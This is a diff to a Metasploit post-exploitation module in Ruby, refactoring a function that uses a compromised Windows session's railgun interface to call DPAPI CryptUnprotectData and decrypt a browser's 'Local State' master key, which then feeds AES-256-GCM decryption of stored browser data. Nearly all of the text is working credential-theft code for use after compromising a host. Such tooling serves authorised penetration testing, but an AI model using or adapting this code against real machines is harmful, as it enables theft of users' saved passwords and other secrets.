@@ -128,33 +128,31 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_data(data)
-    memsize = 1024 * ((data.length + 1023) / 1024)
-    mem_alloc = session.railgun.kernel32.LocalAlloc(0, data.length)
-    mem = mem_alloc['return']
+    mem = session.railgun.kernel32.LocalAlloc(0, data.length)['return']
+    return nil if mem == 0
+
     session.railgun.memwrite(mem, data, data.length)
 
-    if session.arch == 'x86'
-      addr = [mem].pack('V')
-      len = [data.length].pack('V')
-      pdatain = "#{len}#{addr}".force_encoding('ascii')
-      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 8)
-      len, addr = ret['pDataOut'].unpack('V2')
+    if session.arch == ARCH_X86
+      inout_fmt = 'V2'
+    elsif session.arch == ARCH_X64
+      inout_fmt = 'Q2'
     else
-      addr = [mem].pack('Q')
-      len = [data.length].pack('Q')
-      pdatain = "#{len}#{addr}".force_encoding('ascii')
-      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 16)
-      len, addr = ret['pDataOut'].unpack('Q2')
+      fail_with(Failure::NoTarget, "Session architecture must be either x86 or x64.")
     end
 
-    return nil if len == 0
+    pdatain = [data.length, mem].pack(inout_fmt)
+    ret = session.railgun.crypt32.CryptUnprotectData(pdatain, nil, nil, nil, nil, 0, pdatain.length)
+    len, addr = ret['pDataOut'].unpack(inout_fmt)
 
-    decrypted = session.railgun.memread(addr, len)
+    decrypted = len == 0 ? nil : session.railgun.memread(addr, len)
 
-    session.railgun.kernel32.LocalFree(mem)
-    session.railgun.kernel32.LocalFree(addr)
+    multi_rail = []
+    multi_rail << ['kernel32', 'LocalFree', [mem]]
+    multi_rail << ['kernel32', 'LocalFree', [addr]] if addr != 0
+    session.railgun.multi(multi_rail)
 
-    return decrypted
+    decrypted
   end
 
   def process_files(username)
@@ -197,7 +195,7 @@ class MetasploitModule < Msf::Post
               local_state_path = @profiles_path + '\\' + username + @data_path + 'Local State'
               masterkey_encrypted = get_master_key(local_state_path)
               masterkey = decrypt_data(masterkey_encrypted[5..])
-              print_good('Found masterkey!')
+              print_good('Found masterkey!') if masterkey
             end
 
             cipher = OpenSSL::Cipher.new('aes-256-gcm')
